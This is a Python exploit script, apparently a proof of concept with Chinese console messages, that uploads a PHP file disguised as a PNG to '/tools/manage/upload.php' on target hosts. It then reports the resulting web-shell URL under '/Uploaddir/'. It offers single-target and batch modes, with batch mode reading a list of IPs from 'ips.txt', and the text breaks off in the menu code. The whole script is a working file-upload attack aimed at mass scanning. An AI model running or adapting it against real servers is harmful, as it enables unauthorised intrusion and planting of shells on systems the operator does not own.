import requests

headers = {
"Content-Type":"multipart/form-data;boundary=----WebKitFormBoundaryhQcaKJIKAnejKGru"
}

payload = '''------WebKitFormBoundaryhQcaKJIKAnejKGru
Content-Disposition: form-data; name="file";filename="21232f297a57a5a743894a0e4a801f13.php"
Content-Type: image/png

<?php phpinfo();?>
------WebKitFormBoundaryhQcaKJIKAnejKGru--'''


def multi():
    f = open("ips.txt", "r")
    path = "/tools/manage/upload.php"
    for ip in f.readlines():
        ip = ip.replace("\n", "")
        url = "http://{}{}".format(ip, path)
        f_exist = open("存在漏洞.txt", "a+")
        # print(url)
        try:
            res = requests.post(url=url, data=payload, headers=headers)
            # print(res.text)
            if res.text.find("File is valid, and was successfully uploaded") != -1:
                # print("upload success")
                file = "http://{}/Uploaddir/21232f297a57a5a743894a0e4a801f13.php".format(ip)
                print(file)
                f_exist.writelines(file)
                f_exist.writelines("\n")
            else:
                print("不存在此漏洞")
            f_exist.close()
        except Exception as e:
            print("请求异常-------", e.args)


def single():
    f_exist = open("存在漏洞.txt", "w+")
    path = "/tools/manage/upload.php"
    ip = input("目标ip = ")
    ip = ip.replace(" ","")
    url = "http://{}{}".format(ip, path)
    # print(url)
    try:
        res = requests.post(url=url, data=payload, headers=headers)
        # print(res.text)
        if res.text.find("File is valid, and was successfully uploaded") != -1:
            # print("upload success")
            file = "存在漏洞，shell:http://{}/Uploaddir/21232f297a57a5a743894a0e4a801f13.php".format(ip)
            print(file)
            f_exist.writelines(file)
            f_exist.writelines("\n")
        else:
            print("不存在此漏洞")
        f_exist.close()
    except Exception as e:
        print("请求异常-------",e.args)


if __name__ == '__main__':
    info = '''
****************************************

***2.批量文本验证(ips.txt  每行eg:ip:port)

'''
    select = input(info)

    if 1==int(select):
